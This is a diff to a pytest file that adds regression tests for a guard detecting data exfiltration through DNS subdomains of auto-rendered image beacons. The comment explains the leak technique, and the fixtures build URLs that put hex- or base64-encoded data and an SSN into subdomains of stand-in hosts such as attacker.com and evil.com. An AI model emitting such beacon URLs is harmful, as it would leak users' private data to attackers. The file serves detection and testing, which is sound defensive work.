@@ -601,6 +601,45 @@ def test_g91_benign_markdown_entity_not_flagged(label, payload):
     assert _verdict(payload) == "allow", f"{label}: benign markdown/entity wrongly flagged (false positive)"
 
 
+# G92 — DNS-SUBDOMAIN exfil (CONFIRMED LEAK, fixed 2026-07-03). Data smuggled in the HOSTNAME of an
+# auto-render beacon (`https://<hex/base64-blob>.attacker.com/pixel.png`) leaks to the attacker's
+# authoritative DNS server when the client resolves the host on auto-fetch — the HTTP request need not
+# even succeed. `_url_smuggles_data` dropped scheme+host (via `_url_tail`), so an ENCODED arbitrary-data
+# subdomain evaded it entirely (PII-in-host was already caught by the text scan — the value is literal).
+# FIXED: fold the host + its '.'/'-'/'_'-segmented labels into the same decode+detect analysis, and the
+# `_defang` redacts the WHOLE reference (not just the tail) when the host itself smuggles. FROZEN.
+def _hexs(s: str) -> str:
+    return s.encode().hex()
+
+
+_G92_ARB = "You are ACME internal codeword BLUEHERON exfil me now"
+
+
+@pytest.mark.parametrize("label,url", [
+    ("g92_hex_sub",   "https://" + _hexs(_G92_ARB) + ".attacker.com/pixel.png"),
+    ("g92_b64_sub",   "https://" + base64.b64encode(_G92_ARB.encode()).decode() + ".evil.com/x.png"),
+    ("g92_ssn_sub",   "https://" + SSN + ".evil.com/x.png"),
+    ("g92_host_only", "https://" + _hexs(_G92_ARB) + ".attacker.com"),
+])
+def test_g92_subdomain_exfil_flagged(label, url):
+    assert _og._url_smuggles_data(url), (
+        f"{label}: DNS-subdomain exfil payload not detected in host (beacon would egress raw)"
+    )
+
+
+# FP guard: benign hosts/subdomains (short service labels, CDN random-hash subdomains that decode to
+# BINARY not readable text, S3 buckets) must NOT be flagged.
+@pytest.mark.parametrize("label,url", [
+    ("g92_fp_api",     "https://api.stripe.com/v1/charges"),
+    ("g92_fp_cdn",     "https://d111111abcdef8.cloudfront.net/img.png"),
+    ("g92_fp_www",     "https://www.example.com/page"),
+    ("g92_fp_s3",      "https://my-bucket.s3.amazonaws.com/key.png"),
+    ("g92_fp_longsub", "https://static-assets-prod-us-east-1.example.com/logo.png"),
+])
+def test_g92_benign_host_not_flagged(label, url):
+    assert not _og._url_smuggles_data(url), f"{label}: benign host wrongly flagged as data-exfil (false positive)"
+
+
 # G77 — truncation-boundary defense (verified defended, FROZEN against config drift). Obfuscated
 # PII/secret placed PAST patterns._CANON_MAX_LEN escapes the canonical pass (a fullwidth SSN at
 # offset 21k -> detect_pii False, since canonicalize_for_detection only folds text[:_CANON_MAX_LEN];
